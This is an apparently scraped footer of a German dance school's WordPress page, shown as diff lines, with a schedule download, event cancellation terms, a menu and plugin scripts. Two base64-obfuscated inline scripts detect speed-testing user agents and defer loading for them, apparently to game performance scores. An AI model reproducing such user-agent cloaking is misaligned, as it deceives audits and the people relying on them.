+									<p>Lade dir hier den aktuell gültigen Wochenplan herunter. </p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-b8d28bc elementor-widget elementor-widget-elementskit-creative-button" data-id="b8d28bc" data-element_type="widget" data-widget_type="elementskit-creative-button.default">
+				<div class="elementor-widget-container">
+					<div class="ekit-wid-con" >		<div class="ekit-btn-wraper">
+								<a href="https://motsimabuse-dietanzschule.de/wp-content/uploads/2025/06/Wochenplan-2025-NEU.pdf" target="_blank" rel="nofollow" class="ekit_creative_button ekit_slide_left_border" id="" data-text="">
+
+													<i aria-hidden="true" class="ekit_creative_button_icon_before icon icon-download"></i>						
+						<span class="ekit_creative_button_text">DOWNLOAD</span>
+
+																	</a>
+						</div>
+        </div>				</div>
+				</div>
+					</div>
+				</div>
+				</div>
+				<div data-elementor-type="popup" data-elementor-id="8861" class="elementor elementor-8861 elementor-location-popup" data-elementor-settings="{&quot;open_selector&quot;:&quot;a[href=\&quot;#storno\&quot;]&quot;,&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;triggers&quot;:[],&quot;timing&quot;:[]}" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-ec407fb e-flex e-con-boxed e-con e-parent" data-id="ec407fb" data-element_type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-67ccf71 elementor-widget elementor-widget-heading" data-id="67ccf71" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Stornobedingungen für Events</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-08540db elementor-widget elementor-widget-text-editor" data-id="08540db" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Die Buchung für dieses Event ist verbindlich, die Zahlung ist innerhalb von 10 Werktagen fällig – kann binnen dieser 10 Werktage kein Zahlungseingang festgestellt werden, werden die gebuchten Plätze wieder freigegeben</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-1132ea0 elementor-widget elementor-widget-text-editor" data-id="1132ea0" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p><b>Folgende Stornogebühren werden im Falle einer Absage erhoben:</b></p>
+<ul>
+<li>Bis 14 Tage vor Event – 10% Stornogebühr</li>
+<li>14 &#8211; 5 Tage vor Event – 30 % Stornogebühr</li>
+<li>Weniger als 5 Tage – 50% Stornogebühr*</li>
+</ul>								</div>
+				</div>
+				<div class="elementor-element elementor-element-8e65115 elementor-widget elementor-widget-text-editor" data-id="8e65115" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p><b>Die Rückerstattung erfolgt nach Eventpreis:</b></p><div><p><b></b><strong>ab 50,00 EUR</strong><br />Die Rückerstattung erfolgt gemäß den Stornobedinungen in Form eines zweckgebundenen Gutscheines</p></div><p><strong>10,01 EUR &#8211; 49,99 EUR </strong><br />Rückerstattung durch Rücküberweisung gemäß den Stornobedingungen</p><p><strong>*bis 10 EUR</strong><br />keine Rückerstattung bei Absage weniger als 5 Tage vor dem Event</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-72fcefd elementor-widget elementor-widget-text-editor" data-id="72fcefd" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p><strong>Sonderregelung bei Brunch &amp; Feriencamp</strong></p><p>Leider kann bei den Brunches und Feriencamps bei einer kurzfristigen Absage (weniger als 5 Tage vor Event) keine Erstattung, bzw Ausstellung eines Gutscheines mehr erfolgen.</p><p>Sollte das Event von Seiten der Tanzschule aufgrund des nicht Erreichens der Mindestteilnehmerzahl abgesagt werden, erfolgt eine Rückerstattung in voller Höhe per Überweisung.</p>								</div>
+				</div>
+					</div>
+				</div>
+				</div>
+				<nav data-elementor-type="popup" data-elementor-id="1838" class="elementor elementor-1838 elementor-location-popup" data-elementor-settings="{&quot;entrance_animation&quot;:&quot;slideInRight&quot;,&quot;entrance_animation_mobile&quot;:&quot;slideInRight&quot;,&quot;exit_animation&quot;:&quot;slideInRight&quot;,&quot;exit_animation_mobile&quot;:&quot;slideInRight&quot;,&quot;entrance_animation_duration&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0.29999999999999999,&quot;sizes&quot;:[]},&quot;prevent_scroll&quot;:&quot;yes&quot;,&quot;avoid_multiple_popups&quot;:&quot;yes&quot;,&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;triggers&quot;:[],&quot;timing&quot;:{&quot;devices_devices&quot;:[&quot;mobile&quot;],&quot;devices&quot;:&quot;yes&quot;}}" data-elementor-post-type="elementor_library">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-8b16e87 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="8b16e87" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-42ef458" data-id="42ef458" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-8adc9fe elementor-widget elementor-widget-ekit-vertical-menu" data-id="8adc9fe" data-element_type="widget" data-widget_type="ekit-vertical-menu.default">
+				<div class="elementor-widget-container">
+					<div class="ekit-wid-con">        <div 
+            class="ekit-vertical-main-menu-wraper   badge-position-left"
+        >
+                        <div class="ekit-vertical-menu-container"><ul id="menu-main_nav-2" class="ekit-vertical-navbar-nav submenu-click-on-"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12292 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Tanzen<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5774 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/" class="dropdown-item">Kursübersicht</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4223 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-kinder-und-jugendliche/" class="dropdown-item">Kurse für Kinder und Jugendliche</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4224 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/kurse-fuer-erwachsene/" class="dropdown-item">Kurse für Erwachsene</a>	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12352 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kurse/paarkurse/" class="dropdown-item">Paarkurse</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8086 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/schnupperstunden/" class="dropdown-item">Schnupperstunden</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10815 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/gutscheine/" class="dropdown-item">Gutscheine</a></ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12105 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Events<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5545 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/events/" class="dropdown-item">Alle Events</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1136 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/dein-event/" class="dropdown-item">Dein Event</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10512 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/ladies-retreat/" class="dropdown-item">Ladies Just Us Retreat</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10031 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/christmas-cup/" class="dropdown-item">Christmas Cup</a></ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5513 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/fitness/" class="ekit-menu-nav-link">Fitness</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12106 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Online<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6912 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/online-kurse/" class="dropdown-item">Alle Online-Kurse</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1138 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/12-wochen-challenge/" class="dropdown-item">12 Wochen Challenge</a>	<li class="important_item menu-item menu-item-type-post_type menu-item-object-page menu-item-1139 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kursuebersicht/sportpaket/" class="important_item dropdown-item">Online-Mitgliedschaft</a></ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5576 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/die-academy/" class="ekit-menu-nav-link">Die Academy</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-12107 nav-item elementskit-dropdown-has relative_position elementskit-dropdown-menu-default_width elementskit-mobile-builder-content" data-vertical-menu=750px><a href="#" class="ekit-menu-nav-link ekit-menu-dropdown-toggle">Infos<i class="icon icon-down-arrow1 elementskit-submenu-indicator"></i></a>
+<ul class="elementskit-dropdown elementskit-submenu-panel">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10814 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/gutscheine/" class="dropdown-item">Gutscheine</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5631 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/mitgliedschaften/" class="dropdown-item">Mitgliedschaften</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-6615 current_page_item menu-item-7558 nav-item elementskit-mobile-builder-content active" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/trainer/" class="dropdown-item active">Das Team</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5602 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/aboutus/" class="dropdown-item">Über uns</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5136 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/kontakt/" class="dropdown-item">Kontakt</a>	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9807 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://www.free-defy.com/collections/motsi-mabuse-tanzschule" class="dropdown-item">Shop</a>	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9876 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="#wochenplan" class="dropdown-item">Wochenplan</a>	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13005 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a href="https://motsimabuse-dietanzschule.de/newsletter/" class="dropdown-item">Newsletter</a></ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9806 nav-item elementskit-mobile-builder-content" data-vertical-menu=750px><a target="_blank" href="https://www.free-defy.com/collections/motsi-mabuse-tanzschule" class="ekit-menu-nav-link">Shop</a></li>
+</ul></div>        </div>
+        </div>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</nav>
+		<!--googleoff: all--><div data-nosnippet data-borlabs-cookie-consent-required='true' id='BorlabsCookieBox'></div><div id='BorlabsCookieWidget' class='brlbs-cmpnt-container'></div><!--googleon: all-->			<script>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+			<script src="data:text/javascript;base64,dmFyIGtwZGV0ZWN0ZGVsYXlqcyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ3NjcmlwdFt0eXBlPSJyb2NrZXRsYXp5bG9hZHNjcmlwdCJdJykubGVuZ3RoO2lmIChrcGRldGVjdGRlbGF5anMgPj0gMSl7Y2xhc3Mga3Bzb0V4ZWN1dGVTY3JpcHRzIGV4dGVuZHMgUm9ja2V0TGF6eUxvYWRTY3JpcHRze3N0YXRpYyBrcHNvRmlyZSgpe2lmKG5hdmlnYXRvci51c2VyQWdlbnQubWF0Y2goLzUwNjAuMTM0fDEwOS4wLjAuMHxwaW5nfGRhcmV8cHRzdC9pKSl7dmFyIGU9bmV3IFJvY2tldExhenlMb2FkU2NyaXB0cyhbImtleWRvd24iLCJtb3VzZW92ZXIiLCJ0b3VjaG1vdmUiLCJ0b3VjaHN0YXJ0IiwidG91Y2hlbmQiLCJ0b3VjaGNhbmNlbCIsInRvdWNoZm9yY2VjaGFuZ2UiLCJ3aGVlbCJdKTt9ZWxzZXt2YXIgZT1uZXcgUm9ja2V0TGF6eUxvYWRTY3JpcHRzKFsibG9hZCJdKTt9ZS5fYWRkVXNlckludGVyYWN0aW9uTGlzdGVuZXIoZSk7fX1rcHNvRXhlY3V0ZVNjcmlwdHMua3Bzb0ZpcmUoKTt9" id="mLQFAVgBhg"></script>
+	<script src="https://motsimabuse-dietanzschule.de/wp-content/themes/hello-elementor/assets/js/hello-frontend.js?ver=3.4.5" id="hello-theme-frontend-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets//lib/instant-page/instant-page.min.js?ver=3.33.2" id="instant-page-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.33.3" id="elementor-webpack-runtime-js"></script>
+<script id="elementor-frontend-modules-js-before">
+(function() {
+    const allFbWidgets = document.querySelectorAll('div.elementor-widget[data-widget_type^="facebook"]');
+    for (let fb of allFbWidgets) {
+        fb.dataset.widget_type = 'brlabs_' + fb.dataset.widget_type;
+    }
+})();
+(function() {
+    const allYtWidgets = document.querySelectorAll('div.elementor-widget-video[data-widget_type^="video."][data-settings*="youtube_url"]');
+    for (let yt of allYtWidgets) {
+        if (yt.dataset.brlbsUnblocked === 'true') {
+            continue;
+        }
+        yt.dataset.widget_type = 'brlbs_' + yt.dataset.widget_type;
+        yt.dataset.settings = yt.dataset.settings.replace('show_image_overlay', 'brlbs_dont_show_image_overlay');
+    }
+})();
+(function() {
+    window.addEventListener( 'elementor/frontend/init', function() {
+        let first = true;
+        elementorFrontend.hooks.addAction('frontend/element_ready/global', () => {
+            if (first === true) {
+                first = false;
+                const allYoutubeBgs = document.querySelectorAll('[data-brlbs-elementor-bg-video-yt="true"]');
+                if (allYoutubeBgs.length > 0) {
+                    const ytApiReadyOriginal = elementorFrontend.utils.youtube.onApiReady;
+                    let waitingYtCounter = 0;
+                    elementorFrontend.utils.youtube.onApiReady = (callback) => {
+                        document.addEventListener('brlbs_elementor_bgVideo_yt_unblocked', () => {
+                            ytApiReadyOriginal.call(elementorFrontend.utils.youtube, callback);
+                        });
+                        if (++waitingYtCounter === allYoutubeBgs.length) {
+                            elementorFrontend.utils.youtube.onApiReady = ytApiReadyOriginal;
+                            window.brlbsElementorBgVideoYtUnblockReady = { state: true };
+                        }
+                    }
+                }
+
+                const allVimeoBgs = document.querySelectorAll('[data-brlbs-elementor-bg-video-vimeo="true"]');
+                if (allVimeoBgs.length > 0) {
+                    const vimeoApiReadyOriginal = elementorFrontend.utils.vimeo.onApiReady;
+                    let waitingVimeoCounter = 0;
+                    elementorFrontend.utils.vimeo.onApiReady = (callback) => {
+                        document.addEventListener('brlbs_elementor_bgVideo_vimeo_unblocked', () => {
+                            vimeoApiReadyOriginal.call(elementorFrontend.utils.vimeo, callback);
+                        });
+                        if (++waitingVimeoCounter === allVimeoBgs.length) {
+                            elementorFrontend.utils.vimeo.onApiReady = vimeoApiReadyOriginal;
+                            window.brlbsElementorBgVideoVimeoUnblockReady = { state: true };
+                        }
+                    }
+                }
+            }
+        });
+    });
+})();
+</script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.33.3" id="elementor-frontend-modules-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script id="elementor-frontend-js-before">
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Auf Facebook teilen","shareOnTwitter":"Auf Twitter teilen","pinIt":"Anheften","download":"Download","downloadImage":"Bild downloaden","fullscreen":"Vollbild","zoom":"Zoom","share":"Teilen","playVideo":"Video abspielen","previous":"Zur\u00fcck","next":"Weiter","close":"Schlie\u00dfen","a11yCarouselPrevSlideMessage":"Vorheriger Slide","a11yCarouselNextSlideMessage":"N\u00e4chster Slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobil Hochformat","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobil Querformat","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Hochformat","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Querformat","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1500,"default_value":1366,"direction":"max","is_enabled":true},"widescreen":{"label":"Breitbild","value":2400,"default_value":2400,"direction":"min","is_enabled":true}},
+"hasCustomBreakpoints":true},"version":"3.33.3","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"nested-elements":true,"home_screen":true,"global_classes_should_enforce_capabilities":true,"e_variables":true,"cloud-library":true,"e_opt_in_v4_page":true,"import-export-customization":true,"mega-menu":true,"e_pro_variables":true},"urls":{"assets":"https:\/\/motsimabuse-dietanzschule.de\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/motsimabuse-dietanzschule.de\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/motsimabuse-dietanzschule.de\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"daeff62fa7"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"body_background_background":"classic","active_breakpoints":["viewport_mobile","viewport_tablet","viewport_laptop","viewport_widescreen"],"viewport_laptop":1500,"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":6615,"title":"Das%20Team%20-%20Motsi%20Mabuse%20Die%20Taunustanzschule","excerpt":"","featuredImage":false}};
+</script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.33.3" id="elementor-frontend-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/lib/sticky/jquery.sticky.min.js?ver=3.33.2" id="e-sticky-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-includes/js/imagesloaded.min.js?ver=5.0.0" id="imagesloaded-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit-lite/libs/framework/assets/js/frontend-script.js?ver=3.7.7" id="elementskit-framework-js-frontend-js"></script>
+<script id="elementskit-framework-js-frontend-js-after">
+		var elementskit = {
+			resturl: 'https://motsimabuse-dietanzschule.de/wp-json/elementskit/v1/',
+		}
+
+		
+</script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit-lite/widgets/init/assets/js/widget-scripts.js?ver=3.7.7" id="ekit-widget-scripts-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/ele-custom-skin-pro/assets/js/ecspro.js?ver=3.2.5" id="ecspro-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.33.2" id="elementor-pro-webpack-runtime-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
+<script id="wp-i18n-js-after">
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+</script>
+<script id="elementor-pro-frontend-js-before">
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/motsimabuse-dietanzschule.de\/wp-admin\/admin-ajax.php","nonce":"bd8a8616a4","urls":{"assets":"https:\/\/motsimabuse-dietanzschule.de\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/motsimabuse-dietanzschule.de\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":true},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},
+"facebook_sdk":{"lang":"de_DE","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/motsimabuse-dietanzschule.de\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
+</script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.33.2" id="elementor-pro-frontend-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.33.2" id="pro-elements-handlers-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit-lite/widgets/init/assets/js/animate-circle.min.js?ver=3.7.7" id="animate-circle-js"></script>
+<script id="elementskit-elementor-js-extra">
+var ekit_config = {"ajaxurl":"https:\/\/motsimabuse-dietanzschule.de\/wp-admin\/admin-ajax.php","nonce":"4c0e39beda"};
+</script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit-lite/widgets/init/assets/js/elementor.js?ver=3.7.7" id="elementskit-elementor-js"></script>
+<script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit/widgets/init/assets/js/elementor.js?ver=4.1.2" id="elementskit-elementor-pro-js"></script>
+<script id="cz8MjVA6ko" async src="data:text/javascript;base64,aWYobmF2aWdhdG9yLnVzZXJBZ2VudC5tYXRjaCgvNTA2MC4xMzR8MTA5LjAuMC4wfHBpbmd8ZGFyZXxwdHN0L2kpKXt2YXIga3BVc2VySW50ZXJhY3Rpb25FdmVudHM9WyJrZXlkb3duIiwibW91c2VvdmVyIiwidG91Y2htb3ZlIiwidG91Y2hzdGFydCIsInRvdWNoZW5kIiwidG91Y2hjYW5jZWwiLCJ0b3VjaGZvcmNlY2hhbmdlIiwid2hlZWwiXTt9ZWxzZXt2YXIga3BVc2VySW50ZXJhY3Rpb25FdmVudHM9WyJsb2FkIl07fWtwVXNlckludGVyYWN0aW9uRXZlbnRzLmZvckVhY2goZnVuY3Rpb24oZXZlbnQpe3dpbmRvdy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LGtwVHJpZ2dlclNjcmlwdExvYWRlcix7cGFzc2l2ZTp0cnVlfSl9KTtmdW5jdGlvbiBrcFRyaWdnZXJTY3JpcHRMb2FkZXIoKXtod3RMSExvY1JGNmt1M08oKTtrcFVzZXJJbnRlcmFjdGlvbkV2ZW50cy5mb3JFYWNoKGZ1bmN0aW9uKGV2ZW50KXt3aW5kb3cucmVtb3ZlRXZlbnRMaXN0ZW5lcihldmVudCxrcFRyaWdnZXJTY3JpcHRMb2FkZXIse3Bhc3NpdmU6dHJ1ZX0pfSk7fWZ1bmN0aW9uIGh3dExITG9jUkY2a3UzTygpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoImxpbmtbZGF0YS10eXBlPSdrcHBhc3NpdmUnXSIpLmZvckVhY2goZnVuY3Rpb24oZWxlbSl7ZWxlbS5zZXRBdHRyaWJ1dGUoImhyZWYiLGVsZW0uZ2V0QXR0cmlidXRlKCJkYXRhLWtwbGlua2hyZWYiKSl9KTtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgic2NyaXB0W2RhdGEtdHlwZT0na3BwYXNzaXZlJ10iKS5mb3JFYWNoKGZ1bmN0aW9uKGVsZW0pe2VsZW0uc2V0QXR0cmlidXRlKCJzcmMiLGVsZW0uZ2V0QXR0cmlidXRlKCJkYXRhLWtwc2NyaXB0c3JjIikpfSk7fSwyMDApO2lmKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoInZpZGVvW2RhdGEtdHlwZT0na3BwYXNzaXZlJ10iKSl7aWYoZG9jdW1lbnQucXVlcnlTZWxlY3RvcigidmlkZW9bZGF0YS1rcHZpZGVvc3JjXSIpKXtkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJ2aWRlb1tkYXRhLWtwdmlkZW9zcmNdIikuZm9yRWFjaChmdW5jdGlvbihlbGVtKXtlbGVtLnNldEF0dHJpYnV0ZSgic3JjIixlbGVtLmdldEF0dHJpYnV0ZSgiZGF0YS1rcHZpZGVvc3JjIikpfSk7fWlmKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoInZpZGVvW2RhdGEtdHlwZT0na3BwYXNzaXZlJ10gc291cmNlIikpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoInZpZGVvW2RhdGEtdHlwZT0na3BwYXNzaXZlJ106bm90KFtkYXRhLWtwdmlkZW9zcmNdKSIpLmZvckVhY2goZnVuY3Rpb24oZWxlbSl7ZWxlbS5zZXRBdHRyaWJ1dGUoInNyYyIsZWxlbS5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc291cmNlJylbMF0uZ2V0QXR0cmlidXRlKCJkYXRhLWtwdmlkZW9zcmMiKSl9KTt9fX0="></script>
+<template id="brlbs-cmpnt-cb-template-vimeo-content-blocker">
